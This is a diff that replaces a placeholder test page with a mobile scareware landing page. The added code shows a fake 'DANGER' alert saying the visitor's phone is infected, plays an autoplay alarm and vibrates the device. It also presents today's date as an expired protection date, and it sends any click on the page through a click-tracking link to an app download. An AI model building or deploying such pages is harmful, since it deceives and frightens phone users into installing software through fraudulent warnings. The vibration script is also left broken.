@@ -1,9 +1,232 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
 <html>
+
 <head>
-	<title>appintent.com</title>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<!-- Meta tags that set up the page as a mobile page   -->
+<meta name="viewport" content="user-scalable=no, initial-scale=1.0, maximum-scale=1.0, width=device-width">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="format-detection" content="telephone=no">
+<style>
+html,body,div,span,applet,object,iframe,h1,h2,h3,h4,h5,h6,p,blockquote,pre,a,abbr,acronym,address,big,cite,code,del,dfn,em,img,ins,kbd,q,s,samp,small,strike,strong,sub,sup,tt,var,b,u,i,center,dl,dt,dd,ol,ul,li,fieldset,form,label,legend,table,caption,tbody,tfoot,thead,tr,th,td,article,aside,canvas,details,embed,figure,figcaption,footer,header,hgroup,menu,nav,output,ruby,section,summary,time,mark,audio,video{border:0;font-size:100%;font:inherit;vertical-align:baseline;margin:0;padding:0}article,aside,details,figcaption,figure,footer,header,hgroup,menu,nav,section{display:block}body{line-height:1}ol,ul{list-style:none}blockquote,q{quotes:none}blockquote:before,blockquote:after,q:before,q:after{content:none}table{border-collapse:collapse;border-spacing:0}
+BODY.fullPage{ cursor:hand; } 
+body{
+    background: #fafafa;
+    font-family: 'Open Sans', sans-serif;
+    text-align: center;
+    color: #000000;
+}
+
+.repeatBox{
+  border-bottom: 2px solid #7ba506;
+  box-shadow: 0 3px 0 #578701;
+  background-image: -moz-linear-gradient( 90deg, rgb(86,134,1) 0%, rgb(113,172,8) 100%);
+  background-image: -webkit-linear-gradient( 90deg, rgb(86,134,1) 0%, rgb(113,172,8) 100%);
+  background-image: -ms-linear-gradient( 90deg, rgb(86,134,1) 0%, rgb(113,172,8) 100%);
+  width: 100%;
+  height: 119px;
+  z-index: 19;
+}
+
+.logo{
+    top: -68px;
+    position: relative;
+}
+
+.android{
+    top: 15px;
+    position: relative;
+}
+
+.btn{
+    padding-top: 20px;
+    padding-bottom: 20px;
+    line-height: 26px;
+    -webkit-border-radius: 4px;
+    -moz-border-radius: 4px;
+    border-radius: 4px;
+    background-color: #3f9505;
+    margin-bottom: 40px;
+    margin-top: 20px;
+    font-size: 20px;
+    font-weight: bold;
+    color: #fff;
+    text-shadow: 0 1px 2px #086452;
+    display: block;
+    text-decoration: none;
+}
+
+.btn:hover{
+    color: #fff;
+    text-decoration: none;
+}
+
+.container{
+    padding-left: 10px;
+    padding-right: 10px;
+}
+
+.red{
+    color: #ff4545;
+    font-size: 18px;
+    font-weight: bold;
+    line-height: 22px;
+    margin-top: 10px;
+}
+
+.text{
+    margin-top: 15px;
+    line-height: 24px;
+    font-family: 'Verdana';
+}
+
+.title{
+    font-family: 'Verdana';
+    font-size: 20px;
+    font-weight: bold;
+    margin-top: 35px;
+    line-height: 30px;
+}
+
+.title span{
+    font-size: 26px;
+}
+
+.btnContainer{
+    padding-left: 10px;
+    padding-right: 10px;
+}
+
+@media (max-width: 430px) {
+    .repeatBox img{
+        width: 45%;
+    }
+
+    .logo{
+        top: -32%;
+    }
+}
+
+.como{
+    color: #000000;
+    margin-top: 15px;
+}
+
+.passo2{
+    margin-top: 10px;
+}
+
+.passo, .text{
+    font-size: 16px;
+    font-weight: ;
+}
+
+.passo span{
+    color: #000000;
+}
+
+@font-face {
+  font-family: 'Open Sans';
+  font-style: normal;
+  font-weight: 300;
+  src: local('Open Sans Light'), local('OpenSans-Light'), url(http://themes.googleusercontent.com/static/fonts/opensans/v8/DXI1ORHCpsQm3Vp6mXoaTXhCUOGz7vYGh680lGh-uXM.woff) format('woff');
+}
+@font-face {
+  font-family: 'Open Sans';
+  font-style: normal;
+  font-weight: 400;
+  src: local('Open Sans'), local('OpenSans'), url(http://themes.googleusercontent.com/static/fonts/opensans/v8/cJZKeOuBrn4kERxqtaUH3T8E0i7KZn-EPnyo3HZu7kw.woff) format('woff');
+}
+@font-face {
+  font-family: 'Open Sans';
+  font-style: normal;
+  font-weight: 600;
+  src: local('Open Sans Semibold'), local('OpenSans-Semibold'), url(http://themes.googleusercontent.com/static/fonts/opensans/v8/MTP_ySUJH_bn48VBG8sNSnhCUOGz7vYGh680lGh-uXM.woff) format('woff');
+}
+@font-face {
+  font-family: 'Open Sans';
+  font-style: normal;
+  font-weight: 700;
+  src: local('Open Sans Bold'), local('OpenSans-Bold'), url(http://themes.googleusercontent.com/static/fonts/opensans/v8/k3k702ZOKiLJc3WVjuplzHhCUOGz7vYGh680lGh-uXM.woff) format('woff');
+}
+@font-face {
+  font-family: 'Open Sans';
+  font-style: normal;
+  font-weight: 800;
+  src: local('Open Sans Extrabold'), local('OpenSans-Extrabold'), url(http://themes.googleusercontent.com/static/fonts/opensans/v8/EInbV5DfGHOiMmvb1Xr-hnhCUOGz7vYGh680lGh-uXM.woff) format('woff');
+}
+
+</style>
+<script> function goto(){ location.href = "http://1.clktrk.co/click" } </script>
+<script>
+function getURLParameter(name) {
+    return decodeURI(
+        (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || ''
+	);
+}
+</script>
+<script type="text/javascript">
+window.scrollTo(0,1);
+</script>
+
+<script type="text/javascript">
+     alert("***DANGER***\n Your " + (getURLParameter('brand')) + " " + (getURLParameter('model')) + " is SEVERELY infected and Outdated! \n\n The infected Virus is slowing your outdated Android.\n\n Click OK to update and remove Virus");
+</script>
+
+<script language="JavaScript" type="text/javascript">
+
+// enable vibration support
+navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate;
+ 
+if (navigator.vibrate) {
+    navigator.vibrate(1000);
+    
+</script>
+<title>Warning!</title>
+
 </head>
-<body>
-<h1>appintent.com with git</h1>
-<h2>test</h2>
+<body onload="window.scrollTo(0,1);" style="margin:0;padding:0" class="fullPage" onclick="goto();">
+<audio autoplay="autoplay" preload="">
+	<source src="inf/alert.ogg" type="audio/ogg">
+	<source src="inf/alert.mp3" type="audio/mpeg">
+</audio>
+    <div class="repeatBox">
+        <img class="android" src="android.png" alt="">
+        <img class="logo" src="androidlogo.png" alt="">
+    </div>
+        <div class="container">
+            <div class="title">
+                Your <script>document.write(getURLParameter('brand'))</script> <script>document.write(getURLParameter('model'))</script> is Infected and severely Slowed!
+            </div>
+            <div class="text">
+                Your Android is slowed due to SERIOUS virus infection and OUTDATED protection. Android Protection Software Expiry Date: <strong><span style="color: #000000">
+<script type="text/javascript"> 
+                         var month = new Array();
+                         month[0] = "1";month[1] = "2";month[2] = "3";month[3] = "4";month[4] = "5";
+                         month[5] = "6";month[6] = "7";month[7] = "8";month[8] = "9";month[9] = "10";month[10] = "11";
+                         month[11] = "12";
+                         //Array starting at 0 since javascript dates start at 0 instead of 1
+                         var mydate= new Date()
+                         mydate.setDate(mydate.getDate())
+                         document.write(""+mydate.getDate()+"/"+month[mydate.getMonth()]+"/"+mydate.getFullYear());
+                    </script></span></strong>
+                <div class="red">
+                    <div>
+                      <p class="text"> Your current Android is only running at 40% Speed and there's a Virus *Mobile Trojan* damaging your Sim Contacts, Memory Card and your Processor. </p>
+                    <p>
+</p><div class="como">Repair and Speed up your Phone Now for FREE </div>
+
+<div class="passo"><span>Step 1:</span> Download APUS Launcher for Free.</div>
+
+<div class="passo passo2"><span>Passo 2:</span> Open, Scan and Speed up your Android.</div>
+<div class="passo passo2"><span>Passo 3:</span> Save the App in your phone to avoid future Virus Attack!</div><p></p></div>
+                </div>
+            </div>
+            <div class="btnContainer">
+                <a href="http://1.clktrk.co/click" class="btn"> REPAIR </a>
+            </div>
+        </div>
 </body>
+
 </html>
